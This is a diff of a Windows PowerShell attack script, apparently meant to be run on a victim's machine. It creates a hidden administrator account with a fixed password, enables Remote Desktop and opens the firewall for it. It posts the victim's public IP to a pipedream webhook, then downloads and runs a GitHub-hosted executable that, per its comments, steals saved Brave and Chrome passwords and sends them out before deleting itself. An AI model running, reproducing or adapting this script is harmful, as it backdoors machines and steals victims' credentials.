@@ -1,3 +1,4 @@
+# This part creates an account blanka with password Blank@1234.Then it makes the account admin and activates remote desktop for that account (also hides account from lockscreen) (works only if windows on target is pro edition)
 net user blanka Blank@1234 /ADD
 net localgroup Administrators blanka /ADD
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v blanka /t REG_DWORD /d 0 /f
@@ -5,8 +6,9 @@ reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v
 netsh advfirewall firewall add rule name="Remote Desktop" dir=in action=allow program="%SystemRoot%\system32\svchost.exe" service="termservice" enable=yes profile=any localport=3389 protocol=tcp
 net localgroup "Remote Desktop Users" /add
 net localgroup "Remote Desktop Users" blanka /add
+# Sending IP to webhook for remote access
 $PublicIP = Invoke-RestMethod -Uri 'https://api.ipify.org?format=text'
 Invoke-RestMethod -Uri 'https://16b0dcac26d763dafecd45d9e1ff9575.m.pipedream.net' -Method Post -ContentType 'application/json' -Body @{PublicIP=$PublicIP}
+#This downloads beta.exe which gets saved brave and chrome passwords and sends them to webhook (normally this happens too fast for any antivirus to notice it but sometimes it is caught)
 Invoke-WebRequest -Uri 'github.com/Adhrit121/Data_storage/raw/main/beta.exe' -OutFile 'beta.exe'
 Start-Process -FilePath 'beta.exe'; Start-Sleep -Seconds 2; while(Get-Process -Name 'beta' -ErrorAction SilentlyContinue){Start-Sleep -Seconds 1}; Remove-Item 'beta.exe' -Force; clear;
-
